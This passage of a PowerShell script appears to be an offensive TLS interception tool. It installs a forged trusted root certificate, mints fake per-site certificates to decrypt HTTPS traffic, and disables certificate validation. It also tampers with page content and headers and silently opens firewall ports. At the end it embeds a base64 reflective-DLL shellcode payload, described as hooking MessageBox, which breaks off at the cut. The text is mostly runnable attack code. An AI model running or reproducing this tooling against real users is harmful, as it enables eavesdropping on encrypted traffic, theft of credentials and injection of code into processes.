		$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
		$store.Add($CACertificate)
		$store.Close()
									
	}
	else
	{
		return (Get-ChildItem Cert:\CurrentUser\My | Where-Object {$_.Subject -match $CAsubject })
	} 
     
}


function Receive-ServerHttpResponse ([System.Net.WebResponse] $response)
{
	#Returns a Byte[] from HTTPWebRequest, also for HttpWebRequest Exception Handling
	Try
	{
		[string]$rawProtocolVersion = "HTTP/" + $response.ProtocolVersion
		[int]$rawStatusCode = [int]$response.StatusCode
		[string]$rawStatusDescription = [string]$response.StatusDescription
		$rawHeadersString = New-Object System.Text.StringBuilder 
		$rawHeaderCollection = $response.Headers
		$rawHeaders = $response.Headers.AllKeys
		[bool] $transferEncoding = $false 
		# This is used for Chunked Processing.
		
		foreach($s in $rawHeaders)
		{
			 #We'll handle setting cookies later
			if($s -eq "Set-Cookie") { Continue }
			if($s -eq "Transfer-Encoding") 
			{
				$transferEncoding = $true
				continue
			}
			[void]$rawHeadersString.AppendLine($s + ": " + $rawHeaderCollection.Get($s) ) #Use [void] or you will get extra string stuff.
		}	
		$setCookieString = $rawHeaderCollection.Get("Set-Cookie") -Split '($|,(?! ))' #Split on "," but not ", "
		if($setCookieString)
		{
			foreach ($respCookie in $setCookieString)
			{
				if($respCookie -eq "," -Or $respCookie -eq "") {continue}
				[void]$rawHeadersString.AppendLine("Set-Cookie: " + $respCookie) 
			}
		}
		
		$responseStream = $response.GetResponseStream()
		
		$rstring = $rawProtocolVersion + " " + $rawStatusCode + " " + $rawStatusDescription + "`r`n" + $rawHeadersString.ToString() + "`r`n"
		
		[byte[]] $rawHeaderBytes = [System.Text.Encoding]::Ascii.GetBytes($rstring)
		
		Write-Host $rstring 
		
		[void][byte[]] $outdata 
		$tempMemStream = New-Object System.IO.MemoryStream
		[byte[]] $respbuffer = New-Object Byte[] 32768 # 32768
		
		if($transferEncoding)
		{
			$reader = New-Object System.IO.StreamReader($responseStream)
			[string] $responseFromServer = $reader.ReadToEnd()
			
			if ($Tamper)
			{
				if($responseFromServer -match 'Cyber')
				{
					$responseFromServer = $responseFromServer -replace 'Cyber', 'Kitten'
				}
			}
			
			$outdata = [System.Text.Encoding]::UTF8.GetBytes($responseFromServer)
			$reader.Close()
		}
		else
		{
			while($true)
			{
				[int] $read = $responseStream.Read($respbuffer, 0, $respbuffer.Length)
				if($read -le 0)
				{
					$outdata = $tempMemStream.ToArray()
					break
				}
				$tempMemStream.Write($respbuffer, 0, $read)
			}
		
			if ($Tamper -And $response.ContentType -match "text/html")
			{
				
				$outdataReplace = [System.Text.Encoding]::UTF8.GetString($outdata)
				if($outdataReplace -match 'Cyber')
				{
					$outdataReplace = $outdataReplace -Replace 'Cyber', 'Kitten' 
					$outdata = [System.Text.Encoding]::UTF8.GetBytes($outdataReplace)
				}
				
				
			}
		}
		[byte[]] $rv = New-Object Byte[] ($rawHeaderBytes.Length + $outdata.Length)
		#Combine Header Bytes and Entity Bytes 
		
		[System.Buffer]::BlockCopy( $rawHeaderBytes, 0, $rv, 0, $rawHeaderBytes.Length)
		[System.Buffer]::BlockCopy( $outdata, 0, $rv, $rawHeaderBytes.Length, $outdata.Length ) 
	
		
		$tempMemStream.Close()
		$response.Close()
		
		return $rv
	}
	Catch [System.Exception]
	{
		[Console]::WriteLine("Get Response Error")
		[Console]::WriteLine($_.Exception.Message)
    }#End Catch
	
}

function Send-ServerHttpRequest([string] $URI, [string] $httpMethod,[byte[]] $requestBytes, [System.Net.WebProxy] $proxy )
{	
	#Prepare and Send an HttpWebRequest From Byte[] Returns Byte[]
	Try
	{
		$requestParse = [System.Text.Encoding]::UTF8.GetString($requestBytes)
		[string[]] $requestString = ($requestParse -split '[\r\n]') |? {$_} 
		
		[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
		[System.Net.HttpWebRequest] $request = [System.Net.HttpWebRequest] [System.Net.WebRequest]::Create($URI)	
		
		$request.KeepAlive = $false
		$request.ProtocolVersion = [System.Net.Httpversion]::version11 
		$request.ServicePoint.ConnectionLimit = 1
		if($proxy -eq $null) { $request.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy() }
		else { $request.Proxy = $proxy }
		$request.Method = $httpMethod
		$request.AllowAutoRedirect = $false 
		$request.AutomaticDecompression = [System.Net.DecompressionMethods]::None
	
		For ($i = 1; $i -le $requestString.Length; $i++)
		{
			$line = $requestString[$i] -split ": " 
			if ( $line[0] -eq "Host" -Or $line[0] -eq $null ) { continue }
			Try
			{
				#Add Header Properties Defined By Class
				switch($line[0])
				{
					"Accept" { $request.Accept = $line[1] }
					"Connection" { "" }
					"Content-Length" { $request.ContentLength = $line[1] }
					"Content-Type" { $request.ContentType = $line[1] }
					"Expect" { $request.Expect = $line[1] }
					"Date" { $request.Date = $line[1] }
					"If-Modified-Since" { $request.IfModifiedSince = $line[1] }
					"Range" { $request.Range = $line[1] }
					"Referer" { $request.Referer = $line[1] }
					"User-Agent" { $request.UserAgent = $line[1]  + " Intercepted Traffic"} 
					# Added Tampering Here...User-Agent Example
					"Transfer-Encoding"  { $request.TransferEncoding = $line[1] } 
					default {
								if($line[0] -eq "Accept-Encoding")
								{	
									$request.Headers.Add( $line[0], " ") #Take that Gzip...
									#Otherwise have to decompress response to tamper with content...
								}
								else
								{
									$request.Headers.Add( $line[0], $line[1])
								}	
	
							}
				}
				
			}
			Catch
			{
				
			}
		}
			
		if (($httpMethod -eq "POST") -And ($request.ContentLength -gt 0)) 
		{
			[System.IO.Stream] $outputStream = [System.IO.Stream]$request.GetRequestStream()
			$outputStream.Write($requestBytes, $requestBytes.Length - $request.ContentLength, $request.ContentLength)
			$outputStream.Close()
		}
		
		
		return Receive-ServerHttpResponse $request.GetResponse()
		
	}
	Catch [System.Net.WebException]
	{
		#HTTPWebRequest  Throws exceptions based on Server Response.  So catch and return server response
		if ($_.Exception.Response) 
		{
			return Receive-ServerHttpResponse $_.Exception.Response
        }
			
    }#End Catch Web Exception
	Catch [System.Exception]
	{	
		Write-Verbose $_.Exception.Message
	}#End General Exception Occured...
	
}#Proxied Get

function Receive-ClientHttpRequest([System.Net.Sockets.TcpClient] $client, [System.Net.WebProxy] $proxy)
{
	
	Try
	{	
		$clientStream = $client.GetStream()
		$byteArray = new-object System.Byte[] 32768 
		[void][byte[]] $byteClientRequest

		do 
		 {
			[int] $NumBytesRead = $clientStream.Read($byteArray, 0, $byteArray.Length) 
			$byteClientRequest += $byteArray[0..($NumBytesRead - 1)]  
		 
		 } While ($clientStream.DataAvailable -And $NumBytesRead -gt 0) 
			
		#Now you have a byte[] Get a string...  Caution, not all that is sent is "string" Headers will be.
		$requestString = [System.Text.Encoding]::UTF8.GetString($byteClientRequest)
		
		[string[]] $requestArray = ($requestString -split '[\r\n]') |? {$_} 
		[string[]] $methodParse = $requestArray[0] -split " "
		#Begin SSL MITM IF Request Contains CONNECT METHOD
		
		if($methodParse[0] -ceq "CONNECT")
		{
			[string[]] $domainParse = $methodParse[1].Split(":")
			
			$connectSpoof = [System.Text.Encoding]::Ascii.GetBytes("HTTP/1.1 200 Connection Established`r`nTimeStamp: " + [System.DateTime]::Now.ToString() + "`r`n`r`n")
			$clientStream.Write($connectSpoof, 0, $connectSpoof.Length)	
			$clientStream.Flush()
			$sslStream = New-Object System.Net.Security.SslStream($clientStream , $false)
			$sslStream.ReadTimeout = 500
			$sslStream.WriteTimeout = 500
			$sslcertfake = (Get-ChildItem Cert:\CurrentUser\My | Where-Object {$_.Subject -eq "CN=" + $domainParse[0] })
			
			if ($sslcertfake -eq $null)
			{
				$sslcertfake =  Invoke-CreateCertificate $domainParse[0] $false
			}
			
			$sslStream.AuthenticateAsServer($sslcertfake, $false, [System.Security.Authentication.SslProtocols]::Tls12, $false)
		
			$sslbyteArray = new-object System.Byte[] 32768
			[void][byte[]] $sslbyteClientRequest
			
			do 
			 {
				[int] $NumBytesRead = $sslStream.Read($sslbyteArray, 0, $sslbyteArray.Length) 
				$sslbyteClientRequest += $sslbyteArray[0..($NumBytesRead - 1)]  
			 } while ( $clientStream.DataAvailable  )
			
			$SSLRequest = [System.Text.Encoding]::UTF8.GetString($sslbyteClientRequest)
			Write-Host $SSLRequest -Fore Yellow
			
			[string[]] $SSLrequestArray = ($SSLRequest -split '[\r\n]') |? {$_} 
			[string[]] $SSLmethodParse = $SSLrequestArray[0] -split " "
			
			$secureURI = "https://" + $domainParse[0] + $SSLmethodParse[1]
			
			[byte[]] $byteResponse =  Send-ServerHttpRequest $secureURI $SSLmethodParse[0] $sslbyteClientRequest $proxy
			
			if($byteResponse[0] -eq '0x00')
			{
				$sslStream.Write($byteResponse, 1, $byteResponse.Length - 1)
			}
			else
			{
				$sslStream.Write($byteResponse, 0, $byteResponse.Length )
			}
			
			
			
		}#End CONNECT/SSL Processing
		Else
		{
			Write-Host $requestString -Fore Cyan
			[byte[]] $proxiedResponse = Send-ServerHttpRequest $methodParse[1] $methodParse[0] $byteClientRequest $proxy
			if($proxiedResponse[0] -eq '0x00')
			{
				$clientStream.Write($proxiedResponse, 1, $proxiedResponse.Length - 1 )	
			}
			else
			{
				$clientStream.Write($proxiedResponse, 0, $proxiedResponse.Length )	
			}
			
		}#End Http Proxy
		
		
	}# End HTTPProcessing Block
	Catch
	{
		Write-Verbose $_.Exception.Message
		$client.Close()
	}
	Finally
	{
		$client.Close()
	}
                
}

function Main()
{	
	if($Cleanup)
	{
		Invoke-RemoveCertificates( "__Interceptor_Trusted_Root" )
		exit
	}
	
	# Create And Install Trusted Root CA.
	$CAcertificate = (Get-ChildItem Cert:\CurrentUser\My | Where-Object {$_.Subject -match "__Interceptor_Trusted_Root"  })
	if ($CACertificate -eq $null)
	{
		Invoke-CreateCertificate "__Interceptor_Trusted_Root" $true
	}
	# Create Some Certificates Early to Speed up Capture. If you wanted to...
	# You could Add Auto Proxy Configuration here too.
	
	if($HostCA)
	{
		netsh advfirewall firewall delete rule name="Interceptor Proxy 8082" | Out-Null #First Run May Throw Error...Thats Ok..:)
		netsh advfirewall firewall add rule name="Interceptor Proxy 8082" dir=in action=allow protocol=TCP localport=8082 | Out-Null
		Start-CertificateAuthority
		
	}
	
	if($ListenPort)
	{
		$port = $ListenPort
	}
	else
	{
		$port = 8081
	}
	
	$endpoint = New-Object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port)
	$listener = New-Object System.Net.Sockets.TcpListener $endpoint
	
	#This sets up a local firewall rule to suppress the Windows "Allow Listening Port Prompt"
	netsh advfirewall firewall delete rule name="Interceptor Proxy $port" | Out-Null #First Run May Throw Error...Thats Ok..:)
	netsh advfirewall firewall add rule name="Interceptor Proxy $port" dir=in action=allow protocol=TCP localport=$port | Out-Null
	
	if($ProxyServer)
	{
		$proxy = New-Object System.Net.WebProxy($ProxyServer, $ProxyPort)
		[Console]::WriteLine("Using Proxy Server $ProxyServer : $ProxyPort")
	}
	else
	{
		$proxy = $null
		# If you are going Direct.  You need this to be null, or HTTPWebrequest loops...
		[Console]::WriteLine("Using Direct Internet Connection")
	}
		
	
	$listener.Start()
	[Console]::WriteLine("Listening on $port")
	$client = New-Object System.Net.Sockets.TcpClient
	$client.NoDelay = $true
	
	
	while($true)
	{
		
		$client = $listener.AcceptTcpClient()
		
		if($client -ne $null)
		{
			Receive-ClientHttpRequest $client $proxy
		}
		
	}
	

}

# Created With Nick Landers sRDI Tool. 
# Hooks MessageBox 
$MessageBoxHookB64 = '6AAAAABZSYnISIHBUwQAALpFd2IwSYHAU1IBAEG5BgAAAOkbBAAAzMzMSIlcJAhIiWwkEEiJdCQYV0iD7BBlSIsEJWAAAACL8TPtSItQGEyLShBNi0EwTYXAD4S5AAAAQQ8QQVhJY0A8TYsJRoucAIgAAACL1fMPfwQkRYXbdNNIiwQkSMHoEGY76HMmSItMJAhED7dUJAIPvgHByg2AOWF8Bo1UAuDrAgPQSP/BSf/KdeVPjRQYi81Fi1ogTQPYQTlqGHaNQYsbi/1JA9hJg8MED74Dwc8NSP/DA/hAOGv/de+NBBc7xnQN/8FBO0oYctTpXP///0GLUiQDyUmNBBAPtwQBQYtKHMHgAkiYSQPAiwQBSQPA6wIzwEiLXCQgSItsJChIi3QkMEiDxBBfw8zMRIlMJCBMiUQkGIlUJBBTVVZXQVRBVUFWQVdIg+woSIvxuUx3JgdEi+Loyv7//7lJ9wJ4TIvw6L3+//+5WKRT5UyL+Oiw/v//ua+xXJRIi9joo/7//0hjbjwzyUgD7kG4ADAAAItVUESNSUBMi+hIiUQkcP/TRItFVEiL+EiL1kG7AQAAAE2FwHQTSIvISCvOigKIBBFJA9NNK8N180QPt00GD7dFFE2FyXQ2SI1MKCyLUfhEiwFEi1H8SAPXTAPGTSvLTYXSdBBBigBNA8OIAkkD000r03XwSIPBKE2FyXXPi52QAAAASAPfi0MMhcAPhJMAAACLyEgDz0H/1kSLI4tzEEwD50yL6EgD9+tbSYM8JAB0O0i4AAAAAAAAAIBJhQQkdCtJY0U8QQ+3FCRCi4woiAAAAEKLRCkQSCvQQotEKRxJjUwFAIsEkUkDxesOSIsGSYvNSI1UBwJB/9dIiQZIg8YISYPECEiDPgB1n4tDIEiDwxSFwA+Fd////0SLZCR4TItsJHBMi89BvgIAAABMK00wg720AAAAAEGNdv8PhJQAAACLlbAAAABIA9eLQgSFwA+EgAAAALv/DwAARIsCRIvQTI1aCEmD6ghMA8dJ0ep0WEEPtwtMK9YPt8FmwegMZoP4CnUJSCPLTgEMAeszZoP4A3UJSCPLRgEMAeskZjvGdRFJi8FII8tIwegQZkIBBAHrDmZBO8Z1CEgjy2ZGAQwBTQPeTYXSdaiLQgRIA9CLQgSFwHWFi10oRTPAM9JIg8n/SAPfQf/VTIvGi9ZIi8//00WF5A+EmQAAAIO9jAAAAAAPhIwAAACLlYgAAABIA9dEi1oYRYXbdHqDehQAdHREi1IgRItCJDPbTAPXTAPHRYXbdF9FiwpMA88zyUEPvgHByQ1MA84DyEGAef8Ade1EO+F0EAPeSYPCBE0DxkE723LS6y9BD7cAg/j/dCaLUhzB4AJIY8hIjQQPSIuMJIAAAABEiwQCi5QkiAAAAEwDx0H/0EiLx0iDxChBX0FeQV1BXF9eXVvDzMzMzFZIi/RIg+TwSIPsIOjf/P//SIvmXsMAAJAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD4AAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dyYW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAGPUDNsntWKIJ7ViiCe1YoiTKZOII7ViiJMpkYhTtWKIkymQiCq1Yogc62GJILViiBzrZ4kztWKIHOtmiTe1Yoj6SqmIJLViiCe1Y4h9tWKIsOtriSW1Yoi1652IJrViiLDrYIkmtWKIUmljaCe1YogAAAAAAAAAAFBFAABkhgcApOhnWgAAAAAAAAAA8AAiIAsCDgAAngAAAL4AAAAAAABQFQAAABAAAAAAAIABAAAAABAAAAACAAAGAAAAAAAAAAYAAAAAAAAAAKABAAAEAAAAAAAAAgBgAQAAEAAAAAAAABAAAAAAAAAAABAAAAAAAAAQAAAAAAAAAAAAABAAAAAAAAAAAAAAAKQvAQAoAAAAAIABAOABAAAAYAEAhAwAAAAAAAAAAAAAAJABAAQGAACAIQEAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPAhAQCUAAAAAAAAAAAAAAAAsAAAQAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC50ZXh0AAAAwJ0AAAAQAAAAngAAAAQAAAAAAAAAAAAAAAAAACAAAGAucmRhdGEAAFiHAAAAsAAAAIgAAACiAAAAAAAAAAAAAAAAAABAAABALmRhdGEAAAC4GgAAAEABAAAKAAAAKgEAAAAAAAAAAAAAAAAAQAAAwC5wZGF0YQAAhAwAAABgAQAADgAAADQBAAAAAAAAAAAAAAAAAEAAAEAuZ2ZpZHMAAJQAAAAAcAEAAAIAAABCAQAAAAAAAAAAAAAAAABAAABALnJzcmMAAADgAQAAAIABAAACAAAARAEAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAABAYAAACQAQAACAAAAEYBAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQFNIg+wgSI0NUxEBAP8VBaAAAEiLyEiNFTMRAQD/FQWgAABIiQVuSgEASIvYSIXAdH0PtgBMjUwkOLoBAAAAiAVLSgEASIvLxkQkMMzHRCQ4AAAAAESNQj//FaGfAACFwHRD/xWfnwAARTPAM9JIi8j/FbmfAABBuAEAAABIjVQkMEiLy+hWEAAARItEJDhMjUwkOLoBAAAASIvL/xVenwAAhcB1CTPJ/xVinwAAzEiDxCBbw8zMzMzMzMzMzMzMQFNIg+wwSIsdy0kBAEyNTCQgugEAAADHRCQgAAAAAEiLy0SNQj//FRSfAACFwHRV/xUSnwAARTPAM9JIi8j/FSyfAABBuAEAAABIjRV/SQEASIvL6McPAABEi0QkIEyNTCQgugEAAABIi8v/Fc+eAACFwHQQ6Mb+//+4BgAAAEiDxDBbwzPJ/xXDngAAzMzMQFNIg+wgSIvZ/xWpngAARTPAM9JIi8j/FcOeAABIi0sISIsFIEkBAEg5gfgAAAB1DkiNBTj///9IiYH4AAAAM8BIg8QgW8PMzMzMzMzMzMxIg+wog/oBdRdIjRWg////uQEAAAD/FWWeAADoQP7//7gBAAAASIPEKMPMzMzMzMzMzMzMzMxmZg8fhAAAAAAASDsNGS4BAPJ1EkjBwRBm98H///J1AvLDSMHJEOnDAwAAzMzMSIPsKIXSdDmD6gF0KIPqAXQWg/oBdAq4AQAAAEiDxCjD6LIGAADrBeiDBgAAD7bASIPEKMNJi9BIg8Qo6Q8AAABNhcAPlcFIg8Qo6SwBAABIiVwkCEiJdCQQSIl8JCBBVkiD7CBIi/JMi/EzyegmBwAAhMB1BzPA6egAAADopgUAAIrYiEQkQEC3AYM9yjsBAAB0CrkHAAAA6GoKAADHBbQ7AQABAAAA6OsFAACEwHRn6JoLAABIjQ3fCwAA6CoJAADo6QkAAEiNDfIJAADoGQkAAOgECgAASI0VnZ8AAEiNDXafAADo4R0AAIXAdSnocAUAAITAdCBIjRVVnwAASI0NRp8AAOhJHQAAxwVHOwEAAgAAAEAy/4rL6C0IAABAhP8PhU7////oywkAAEiL2EiDOAB0JEiLyOhyBwAAhMB0GEiLG0iLy+ibCwAATIvGugIAAABJi87/0/8FfDUBALgBAAAASItcJDBIi3QkOEiLfCRISIPEIEFew8xIiVwkCEiJdCQYV0iD7CBAivGLBUg1AQAz24XAfwQzwOtQ/8iJBTY1AQDofQQAAECK+IhEJDiDPaM6AQACdAq5BwAAAOhDCQAA6IoFAACJHYw6AQDorwUAAECKz+hvBwAAM9JAis7oiQcAAITAD5XDi8NIi1wkMEiLdCRASIPEIF/DzMxIi8RIiVggTIlAGIlQEEiJSAhWV0FWSIPsQEmL8Iv6TIvxhdJ1DzkVsDQBAH8HM8DpsgAAAI1C/4P4AXcq6LYAAACL2IlEJDCFwA+EjQAAAEyLxovXSYvO6KP9//+L2IlEJDCFwHR2TIvGi9dJi87oKP3//4vYiUQkMIP/AXUrhcB1J0yLxjPSSYvO6Az9//9Mi8Yz0kmLzuhj/f//TIvGM9JJi87oTgAAAIX/dAWD/wN1KkyLxovXSYvO6ED9//+L2IlEJDCFwHQTTIvGi9dJi87oIQAAAIvYiUQkMOsGM9uJXCQwi8NIi1wkeEiDxEBBXl9ew8zMzEiJXCQISIlsJBBIiXQkGFdIg+wgSIsdqZ0AAEmL+IvySIvpSIXbdQWNQwHrEkiLy+i7CQAATIvHi9ZIi83/00iLXCQwSItsJDhIi3QkQEiDxCBfw0iJXCQISIl0JBBXSIPsIEmL+IvaSIvxg/oBdQXolwYAAEyLx4vTSIvOSItcJDBIi3QkOEiDxCBf6Xf+///MzMxAU0iD7CBIi9kzyf8Vt5oAAEiLy/8VppoAAP8VWJoAAEiLyLoJBADASIPEIFtI/yWcmgAASIlMJAhIg+w4uRcAAADot5IAAIXAdAe5AgAAAM0pSI0NpzMBAOjKAQAASItEJDhIiQWONAEASI1EJDhIg8AISIkFHjQBAEiLBXc0AQBIiQXoMgEASItEJEBIiQXsMwEAxwXCMgEACQQAwMcFvDIBAAEAAADHBcYyAQABAAAAuAgAAABIa8AASI0NvjIBAEjHBAECAAAAuAgAAABIa8AASIsNlikBAEiJTAQguAgAAABIa8ABSIsNiSkBAEiJTAQgSI0NPZwAAOgA////SIPEOMPMzMxIg+wouQgAAADoBgAAAEiDxCjDzIlMJAhIg+wouRcAAADo0JEAAIXAdAiLRCQwi8jNKUiNDb8yAQDocgAAAEiLRCQoSIkFpjMBAEiNRCQoSIPACEiJBTYzAQBIiwWPMwEASIkFADIBAMcF5jEBAAkEAMDHBeAxAQABAAAAxwXqMQEAAQAAALgIAAAASGvAAEiNDeIxAQCLVCQwSIkUAUiNDYubAADoTv7//0iDxCjDzEiJXCQgV0iD7EBIi9n/Fd2YAABIi7v4AAAASI1UJFBIi89FM8D/Fc2YAABIhcB0MkiDZCQ4AEiNTCRYSItUJFBMi8hIiUwkMEyLx0iNTCRgSIlMJCgzyUiJXCQg/xWemAAASItcJGhIg8RAX8PMzMxAU1ZXSIPsQEiL2f8Vb5gAAEiLs/gAAAAz/0UzwEiNVCRgSIvO/xVdmAAASIXAdDlIg2QkOABIjUwkaEiLVCRgTIvISIlMJDBMi8ZIjUwkcEiJTCQoM8lIiVwkIP8VLpgAAP/Hg/8CfLFIg8RAX15bw8zMzEiD7CjojwgAAIXAdCFlSIsEJTAAAABIi0gI6wVIO8h0FDPA8EgPsQ0QNgEAde4ywEiDxCjDsAHr98zMzEiD7CjoUwgAAIXAdAfoegYAAOsZ6DsIAACLyOi0HgAAhcB0BDLA6wfoOyIAALABSIPEKMNIg+woM8noQQEAAITAD5XASIPEKMPMzMxIg+wo6IsOAACEwHUEMsDrEujmJwAAhMB1B+iJDgAA6+ywAUiDxCjDSIPsKOjfJwAA6HIOAACwAUiDxCjDzMzMSIlcJAhIiWwkEEiJdCQYV0iD7CBJi/lJi/CL2kiL6eisBwAAhcB1F4P7AXUSSIvP6MMFAABMi8Yz0kiLzf/XSItUJFiLTCRQSItcJDBIi2wkOEiLdCRASIPEIF/pxxcAAMzMzEiD7CjoYwcAAIXAdBBIjQ0ENQEASIPEKOkrJQAA6JobAACFwHUF6HUbAABIg8Qow0iD7CgzyehVJwAASIPEKOn0DQAAQFNIg+wgD7YF9zQBAIXJuwEAAAAPRMOIBec0AQDoNgUAAOhRDQAAhMB1BDLA6xTozCYAAITAdQkzyeiVDQAA6+qKw0iDxCBbw8zMzEiJXCQIVUiL7EiD7ECL2YP5AQ+HpgAAAOi/BgAAhcB0K4XbdSdIjQ1cNAEA6MMkAACFwHQEMsDrekiNDWA0AQDoryQAAIXAD5TA62dIixXFJQEASYPI/4vCuUAAAACD4D8ryLABSdPITDPCTIlF4EyJRegPEEXgTIlF8PIPEE3wDxEFATQBAEyJReBMiUXoDxBF4EyJRfDyDxEN+TMBAPIPEE3wDxEF9TMBAPIPEQ39MwEASItcJFBIg8RAXcO5BQAAAOhcAgAAzMzMzEiD7BhMi8G4TVoAAGY5BTnl//91eUhjBWzl//9IjRUp5f//SI0MEIE5UEUAAHVfuAsCAABmOUEYdVRMK8IPt0EUSI1RGEgD0A+3QQZIjQyATI0MykiJFCRJO9F0GItKDEw7wXIKi0IIA8FMO8ByCEiDwijr3zPSSIXSdQQywOsUg3okAH0EMsDrCrAB6wYywOsCMsBIg8QYw8zMzEBTSIPsIIrZ6GcFAAAz0oXAdAuE23UHSIcV+jIBAEiDxCBbw0BTSIPsIIA9HzMBAACK2XQEhNJ1DorL6EQlAACKy+jZCwAAsAFIg8QgW8PMQFNIg+wgSIsVUyQBAEiL2YvKSDMVtzIBAIPhP0jTykiD+v91CkiLy+jDIgAA6w9Ii9NIjQ2XMgEA6D4jAAAzyYXASA9Ey0iLwUiDxCBbw8xIg+wo6Kf///9I99gbwPfY/8hIg8Qow8xIiVwkIFVIi+xIg+wgSINlGABIuzKi3y2ZKwAASIsF1SMBAEg7w3VvSI1NGP8VTpQAAEiLRRhIiUUQ/xU4lAAAi8BIMUUQ/xUklAAAi8BIjU0gSDFFEP8VDJQAAItFIEiNTRBIweAgSDNFIEgzRRBIM8FIuf///////wAASCPBSLkzot8tmSsAAEg7w0gPRMFIiQVhIwEASItcJEhI99BIiQVaIwEASIPEIF3DSI0N9TEBAEj/Jc6TAADMzEiNDeUxAQDp0AoAAEiNBekxAQDDSI0F6TEBAMNIg+wo6Of///9IgwgE6Ob///9IgwgCSIPEKMPMSI0FpT0BAMODJcUxAQAAw0iJXCQIVUiNrCRA+///SIHswAUAAIvZuRcAAADoYYsAAIXAdASLy80pgyWUMQEAAEiNTfAz0kG40AQAAOiTCgAASI1N8P8V4ZIAAEiLnegAAABIjZXYBAAASIvLRTPA/xXPkgAASIXAdDxIg2QkOABIjY3gBAAASIuV2AQAAEyLyEiJTCQwTIvDSI2N6AQAAEiJTCQoSI1N8EiJTCQgM8n/FZaSAABIi4XIBAAASI1MJFBIiYXoAAAAM9JIjYXIBAAAQbiYAAAASIPACEiJhYgAAADo/AkAAEiLhcgEAABIiUQkYMdEJFAVAABAx0QkVAEAAAD/FZKSAACD+AFIjUQkUEiJRCRASI1F8A+Uw0iJRCRIM8n/FTGSAABIjUwkQP8VHpIAAIXAdQr22xvAIQWQMAEASIucJNAFAABIgcTABQAAXcPMzMxIiVwkCEiJdCQQV0iD7CBIjR02BwEASI01LwcBAOsWSIs7SIX/dApIi8/oaQAAAP/XSIPDCEg73nLlSItcJDBIi3QkOEiDxCBfw8zMSIlcJAhIiXQkEFdIg+wgSI0d+gYBAEiNNfMGAQDrFkiLO0iF/3QKSIvP6B0AAAD/10iDwwhIO95y5UiLXCQwSIt0JDhIg8QgX8PMzEj/JU2TAADMSIlcJBBIiXwkGFVIi+xIg+wgg2XoADPJM8DHBQQhAQACAAAAD6JEi8HHBfEgAQABAAAAgfFjQU1ERIvKRIvSQYHxZW50aUGB8mluZUlBgfBudGVsRQvQRIvbRIsFfy8BAEGB80F1dGhFC9mL00QL2YHyR2VudTPJi/hEC9K4AQAAAA+iiUXwRIvJRIlN+IvIiV30iVX8RYXSdVJIgw2JIAEA/0GDyAQl8D//D0SJBS0vAQA9wAYBAHQoPWAGAgB0IT1wBgIAdBoFsPn8/4P4IHcbSLsBAAEAAQAAAEgPo8NzC0GDyAFEiQXzLgEARYXbdRmB4QAP8A+B+QAPYAByC0GDyAREiQXVLgEAuAcAAACJVeBEiU3kO/h8JDPJD6KJRfCJXfSJTfiJVfyJXegPuuMJcwtBg8gCRIkFoS4BAEEPuuEUc27HBdQfAQACAAAAxwXOHwEABgAAAEEPuuEbc1NBD7rhHHNMM8kPAdBIweIgSAvQSIlVEEiLRRAkBjwGdTKLBaAfAQCDyAjHBY8fAQADAAAA9kXoIIkFiR8BAHQTg8ggxwV2HwEABQAAAIkFdB8BAEiLXCQ4M8BIi3wkQEiDxCBdw8zMuAEAAADDzMwzwDkF1DkBAA+VwMPMzMzMzMxmZg8fhAAAAAAATIvZTIvSSYP4EA+GcAAAAEmD+CB2Skgr0XMPSYvCSQPASDvID4w2AwAASYH4gAAAAA+GaQIAAA+6JbUtAQABD4OrAQAASYvDTIvfSIv5SYvITIvGSYvy86RJi/BJi/vDDxACQQ8QTBDwDxEBQQ8RTAjwSIvBw2ZmDx+EAAAAAABIi8FMjQ2W3v//Q4uMgXchAABJA8n/4cAhAADfIQAAwSEAAM8hAAALIgAAECIAACAiAAAwIgAAyCEAAGAiAABwIgAA8CEAAIAiAABIIgAAkCIAALAiAADlIQAADx9EAADDD7cKZokIw0iLCkiJCMMPtwpED7ZCAmaJCESIQALDD7YKiAjD8w9vAvMPfwDDZpBMiwIPt0oIRA+2SgpMiQBmiUgIRIhICkmLy8OLCokIw4sKRA+2QgSJCESIQATDZpCLCkQPt0IEiQhmRIlABMOQiwpED7dCBEQPtkoGiQhmRIlABESISAbDTIsCi0oIRA+2SgxMiQCJSAhEiEgMw2aQTIsCD7ZKCEyJAIhICMNmkEyLAg+3SghMiQBmiUgIw5BMiwKLSghMiQCJSAjDDx8ATIsCi0oIRA+3SgxMiQCJSAhmRIlIDMNmDx+EAAAAAABMiwKLSghED7dKDEQPtlIOTIkAiUgIZkSJSAxEiFAOww8QBApMA8FIg8EQQfbDD3QTDyjISIPh8A8QBApIg8EQQQ8RC0wrwU2LyEnB6QcPhIgAAAAPKUHwTDsNER0BAHYX6cIAAABmZg8fhAAAAAAADylB4A8pSfAPEAQKDxBMChBIgcGAAAAADylBgA8pSZAPEEQKoA8QTAqwSf/JDylBoA8pSbAPEEQKwA8QTArQDylBwA8pSdAPEEQK4A8QTArwda0PKUHgSYPgfw8owesMDxAECkiDwRBJg+gQTYvIScHpBHQcZmZmDx+EAAAAAAAPEUHwDxAECkiDwRBJ/8l170mD4A90DUmNBAgPEEwC8A8RSPAPEUHwSYvDww8fQAAPK0HgDytJ8A8YhAoAAgAADxAECg8QTAoQSIHBgAAAAA8rQYAPK0mQDxBECqAPEEwK